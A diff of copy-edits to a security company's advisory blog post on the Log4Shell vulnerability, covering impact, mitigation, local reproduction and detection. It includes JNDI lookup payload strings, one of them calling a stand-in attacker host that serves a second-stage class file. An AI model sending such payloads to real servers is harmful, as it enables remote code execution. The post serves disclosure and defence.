@@ -31,8 +31,8 @@ including our automated scanning tool.**
 **Also read: Our analysis of [CVE-2021-45046](https://www.lunasec.io/docs/blog/log4j-zero-day-update-on-cve-2021-45046) (a second log4j vulnerability).**
 
 ## What is it?
-On Thursday (December 9th), a 0-day exploit in the
-popular Java logging library `log4j` (version 2) was discovered that results in Remote Code Execution (RCE) by
+On Thursday, December 9th, a 0-day exploit in the
+popular Java logging library `log4j` (version 2) was discovered that results in Remote Code Execution (RCE), by
 logging a certain string.
 
 Given how ubiquitous this library is, the impact of the exploit (full server control), and how easy it is to exploit,
@@ -50,8 +50,8 @@ _This blog post is also available at https://log4shell.com/_
 
 ## Who is impacted?
 
-Many, many services are vulnerable to this exploit.  Cloud services like [Steam, Apple iCloud](https://news.ycombinator.com/item?id=29499867), and apps like
-Minecraft have already been found to be vulnerable.
+Many, many services are vulnerable to this exploit.  Cloud services like [Steam, Apple iCloud](https://news.ycombinator.com/item?id=29499867), as well as apps like
+Minecraft, have already been found to be vulnerable.
 
 An extensive list of responses from impacted organizations has been compiled [here](https://gist.github.com/SwitHak/b66db3a06c2955a9cb71a8718970c592).
 
@@ -68,12 +68,14 @@ vulnerability in Apple's servers.
 **Updates (3 hours after posting):**
 According to [this blog post](https://www.cnblogs.com/yyhuni/p/15088134.html) (see [translation](https://www-cnblogs-com.translate.goog/yyhuni/p/15088134.html?_x_tr_sl=auto&_x_tr_tl=en&_x_tr_hl=en-US)),
 JDK versions greater than `6u211`, `7u201`, `8u191`, and `11.0.1` are not affected by the LDAP attack vector. In these versions
-`com.sun.jndi.ldap.object.trustURLCodebase` is set to `false` meaning JNDI cannot load remote code using LDAP.
-
+`com.sun.jndi.ldap.object.trustURLCodebase` is set to `false` meaning JNDI cannot load remote code using LDAP, except in [very
+specific cases](https://alex-kiselyov.medium.com/why-trusturlcodebase-may-not-save-you-from-log4j2-ldap-vulnerability-cve-2021-44228-f87b3c1eadaf).
 However, there are other attack vectors targeting this vulnerability which can result in RCE. An attacker could still leverage
 existing code on the server to execute a payload. An attack targeting the class
 `org.apache.naming.factory.BeanFactory`, present on Apache Tomcat servers, is discussed
-in [this blog post](https://www.veracode.com/blog/research/exploiting-jndi-injections-java).
+in [this blog post](https://www.veracode.com/blog/research/exploiting-jndi-injections-java). Also, there are some specific configurations where
+a remote JNDI fetch could still take place, as described in [this post](https://alex-kiselyov.medium.com/why-trusturlcodebase-may-not-save-you-from-log4j2-ldap-vulnerability-cve-2021-44228-f87b3c1eadaf).
+Please update to the latest version of log4j for a more complete solution. 
 
 ** Edit: ** To see if you are impacted, you can use our [automatic scanning tool](https://www.lunasec.io/docs/blog/log4j-zero-day-mitigation-guide).
 
@@ -95,7 +97,7 @@ of service (DOS) attack](https://logging.apache.org/log4j/2.x/security.html).
 :::
 ### log4j v1
 
-Version 1 of log4j is vulnerable to other RCE attacks, and if you're using it you need to 
+Version 1 of log4j is vulnerable to other RCE attacks, and if you're using it, you need to 
 [migrate](https://logging.apache.org/log4j/2.x/manual/migration.html) to `2.17.0`.
 
 ## Permanent Mitigation
@@ -112,9 +114,9 @@ The release can also be downloaded from the Apache Log4j [Download](https://logg
 **For Current Information:** Please read our follow-up guide on [log4j mitigation strategies](https://www.lunasec.io/docs/blog/log4j-zero-day-mitigation-guide).
 
 :::warning `formatMsgNoLookups` Does not protect against all attacks
-As of Tuesday, Dec 14, it's been found that this flag is ineffective at stopping certain attacks, partially explained 
+As of Tuesday, Dec 14, it's been found that this flag is ineffective at stopping certain attacks, which is partially explained in
 [CVE-2021-45046](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-45046).  
-You must update to `2.17.0` or use the JNDI patches for temporary mitigation explained in [our mitigation guide](https://www.lunasec.io/docs/blog/log4j-zero-day-mitigation-guide/).
+You must update to `2.17.0`, or use the JNDI patches for temporary mitigation explained in [our mitigation guide](https://www.lunasec.io/docs/blog/log4j-zero-day-mitigation-guide/).
 :::
 
 As per [this discussion on HackerNews](https://news.ycombinator.com/item?id=29507263):
@@ -124,21 +126,21 @@ As per [this discussion on HackerNews](https://news.ycombinator.com/item?id=2950
 > If you are using a version older than 2.10.0 and cannot upgrade, your mitigation choices are:
 >
 > - ~~Modify every logging pattern layout to say `%m{nolookups}` instead of `%m` in your logging
->   config files, see details at https://issues.apache.org/jira/browse/LOG4J2-2109 (only works on
->   versions >= 2.7) or,~~ This is a bad strategy that will likely result in a vulnerability long-term.
+>   config files. See details at https://issues.apache.org/jira/browse/LOG4J2-2109 This only works on
+>   versions >= 2.7.~~ This is a bad strategy which will likely result in a vulnerability long-term.
 >
 > - Substitute a non-vulnerable or empty implementation of the
     class org.apache.logging.log4j.core.lookup.JndiLookup, in a way that your classloader uses your
-    replacement instead of the vulnerable version of the class. Refer to your application's or
+    replacement instead of the vulnerable version of the class. Refer to your application or
     stack's classloading documentation to understand this behavior.
 
 ## How the exploit works
 
 ### Exploit Requirements
 
-- A server with a vulnerable `log4j` version (listed above),
-- an endpoint with any protocol (HTTP, TCP, etc) that allows an attacker to send the exploit string,
-- and a log statement that logs out the string from that request.
+- A server with a vulnerable `log4j` version (listed above).
+- An endpoint with any protocol (HTTP, TCP, etc), that allows an attacker to send the exploit string.
+- A log statement that logs out the string from that request.
 
 ### Example Vulnerable Code
 
@@ -185,13 +187,13 @@ In a terminal run:
 docker run -p 8080:8080 ghcr.io/christophetd/log4shell-vulnerable-app
 ```
 
-and in another:
+And in another:
 
 ```shell
 curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://127.0.0.1/a}'
 ```
 
-the logs should include an error message indicating that a remote lookup was attempted but failed:
+The logs should include an error message indicating that a remote lookup was attempted but failed:
 
 ```shell
 2021-12-10 17:14:56,207 http-nio-8080-exec-1 WARN Error looking up JNDI resource [ldap://127.0.0.1/a]. javax.naming.CommunicationException: 127.0.0.1:389 [Root exception is java.net.ConnectException: Connection refused (Connection refused)]
@@ -199,10 +201,10 @@ the logs should include an error message indicating that a remote lookup was att
 
 ### Exploit Steps
 
-1. Data from the User gets sent to the server (via any protocol),
-2. The server logs the data in the request, containing the malicious payload: `${jndi:ldap://some-attacker.com/a}` (where `some-attacker.com` is an attacker controlled server),
-3. The `log4j` vulnerability is triggered by this payload and the server makes a request to `some-attacker.com` via "[Java Naming and Directory Interface](https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf)" (JNDI),
-4. This response contains a path to a remote Java class file (ex. `http://second-stage.some-attacker.com/Exploit.class`) which is injected into the server process,
+1. Data from the User gets sent to the server (via any protocol).
+2. logs the data containing the malicious payload from the request `${jndi:ldap://some-attacker.com/a}`, where `some-attacker.com` is an attacker controlled server.
+3. The `log4j` vulnerability is triggered by this payload and the server makes a request to `some-attacker.com` via "[Java Naming and Directory Interface](https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf)" (JNDI).
+4. This response contains a path to a remote Java class file (ex. `http://second-stage.some-attacker.com/Exploit.class`), which is injected into the server process.
 5. This injected payload triggers a second stage, and allows an attacker to execute arbitrary code.
 
 Due to how common Java vulnerabilities such as these are, security researchers have created tools to easily exploit
@@ -211,7 +213,8 @@ exploit payload that could be used for this vulnerability. You can refer to [thi
 
 ## How to identify vulnerable remote servers
 
-Make sure that you have permission from the owner of the server to be penetration tested.  
+:::info Make sure that you have permission from the owner of the server being penetration tested.
+:::  
 
 The simplest way to detect if a remote endpoint is vulnerable is to trigger a DNS query. As explained above,
 the exploit will cause the vulnerable server to attempt to fetch some remote code.  By using the address
@@ -219,7 +222,7 @@ of a free online DNS logging tool in the exploit string, we can detect when the 
 
 [CanaryTokens.org](https://canarytokens.org/generate#) is an Open Source web app for this purpose that even generates the exploit string automatically 
 and sends an email notification when the DNS is queried.  Select `Log4Shell` from the drop-down menu. Then, embed the string 
-in a request field that you expect the server to log.  This could be an anything from a form
+in a request field that you expect the server to log.  This could be in anything from a form
 input to an HTTP header.  In our example above, the X-Api-Version header was being logged. This request should trigger it:
 
 ```shell
@@ -237,9 +240,9 @@ You can follow us on [Twitter](https://twitter.com/LunaSecIO), or subscribe belo
 information about the impact of this exploit becomes available.
 
 We have published a series of posts about Log4Shell on our blog that you might be interested in:
-- **[Mitigation Guide](https://www.lunasec.io/docs/blog/log4j-zero-day-mitigation-guide/)**,
-- **[Explanation of the 2nd Log4j CVE](https://www.lunasec.io/docs/blog/log4j-zero-day-update-on-cve-2021-45046/)**,
-- **[Part 1: Log4Shell Live Patch (Background Context)](https://www.lunasec.io/docs/blog/log4shell-live-patch/)**,
+- **[Mitigation Guide](https://www.lunasec.io/docs/blog/log4j-zero-day-mitigation-guide/)**
+- **[Explanation of the 2nd Log4j CVE](https://www.lunasec.io/docs/blog/log4j-zero-day-update-on-cve-2021-45046/)**
+- **[Part 1: Log4Shell Live Patch (Background Context)](https://www.lunasec.io/docs/blog/log4shell-live-patch/)**
 - **[Part 2: Log4Shell Live Patch (Technical Deep-Dive)](https://www.lunasec.io/docs/blog/log4shell-live-patch-technical/)**
 
 ### Limit your vulnerability to future attacks
@@ -249,7 +252,7 @@ that helps [isolate and protect](https://www.lunasec.io/docs/pages/how-it-works/
 Log4Shell.
 
 We also offer a [managed 0-day mitigation service](https://www.lunasec.io/pages/live-dependency-patching) that
-automatically to quickly patches your live server's dependencies whenever a new 0-day is announced.
+automatically and quickly patches your live server's dependencies whenever a new 0-day is announced.
 
 ### Stay Updated
 
@@ -268,25 +271,25 @@ import ContactForm from '../src/components/ContactForm.jsx'
 
 ### Edits
 
-1. Updated the "Who is impacted?" section to include mitigating factor based on JDK version, but also suggest other exploitation
-methods are still prevalent.
-2. ~~Named the vulnerability "LogJam",~~ added CVE, and added link to release tags.
-3. Update mitigation steps with newer information.
+1. Updated the "Who is impacted?" section to include mitigating factors based on JDK version, while also suggesting other exploitation
+methods as still prevalent.
+2. ~~Named the vulnerability "LogJam"~~ Added CVE, and added link to release tags.
+3. Updated mitigation steps with newer information.
 4. Removed the name "LogJam" because it's already been [used](https://en.wikipedia.org/wiki/Logjam_(computer_security)). Using "Log4Shell" instead.
 5. Update that 2.15.0 is released.
 6. Added the MS Paint logo[4], and updated example code to be slightly more clear (it's not string concatenation).
-7. Reported on iPhones being affected by the vulnerability, and included local reproduction code + steps.
-8. Update social info.
+7. Reported on iPhones being affected by the vulnerability, and included local reproduction code and steps.
+8. Updated social info.
 9. Updated example code to use Log4j2 syntax.
-10. Update title because of some confusion.
+10. Updated title because of some confusion.
 11. Better DNS testing site and explanation
 12. Added link to the [Log4Shell Mitigation Guide](https://www.lunasec.io/docs/blog/log4j-zero-day-mitigation-guide/).
 13. Add warnings about limited vuln in 2.15 / noMsgFormatLookups
 14. Added link to 2nd CVE.
 15. Updated contact information.
-16. Updated original twitter link from @P0rZ9 as the original tweet was deleted. Changed from `https://twitter.com/P0rZ9/status/1468949890571337731` to `https://web.archive.org/web/20211209230040/https://twitter.com/P0rZ9/status/1468949890571337731`
+16. Updated original Twitter link from @P0rZ9 as the original tweet was deleted. Changed from `https://twitter.com/P0rZ9/status/1468949890571337731` to `https://web.archive.org/web/20211209230040/https://twitter.com/P0rZ9/status/1468949890571337731`.
 17. Added links to other blog posts.
-18. Update post to include latest version 2.17.0 release.
+18. Updated post to include latest version 2.17.0 release.
 
 ### Editing this post
 
